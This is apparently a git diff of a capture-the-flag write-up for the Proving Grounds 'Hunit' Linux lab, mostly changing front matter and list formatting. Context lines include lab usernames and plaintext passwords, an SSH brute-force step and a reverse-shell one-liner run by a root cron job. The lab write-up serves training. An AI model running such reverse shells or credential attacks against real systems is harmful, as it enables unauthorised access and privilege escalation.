@@ -1,20 +1,10 @@
 ---
 title: "Proving grounds Practice: Hunit"
 layout: post
-date: 2024-02-25 02:00
-tag: 
-- CTF
-- Offsec labs
-- OSCP
-- Writeup
-- Linux
-- PG-Practice
-- Git server
-writeups: true
-hidden: true
-author: Naveen
-description: "Offsec proving grounds practice linux machine writeup"
+categories: writeup
 ---
+
+Proving grounds Practice - Hunit CTF writeup.
 
 # NMAP
 
@@ -83,18 +73,20 @@ None
 ```
 
 ### Users
-rjackson
-jsanchez
-dademola
-jwinters
-jvargas
+- rjackson
+- jsanchez
+- dademola
+- jwinters
+- jvargas
 
 ### Passwords
+```text
 yYJcgYqszv4aGQ
 d52cQ1BzyNQycg
 ExplainSlowQuest110
 KTuGcSW6Zxwd0Q
 OuQ96hcgiM5o9w
+```
 
 ## Brute force credentials for SSH
 
@@ -235,4 +227,4 @@ sh -i >& /dev/tcp/192.168.45.196/8080 0>&1
 
 Once the cron job running the reverse shell with root privilege will be obtained.
 
-For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
+For more updates and insights, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
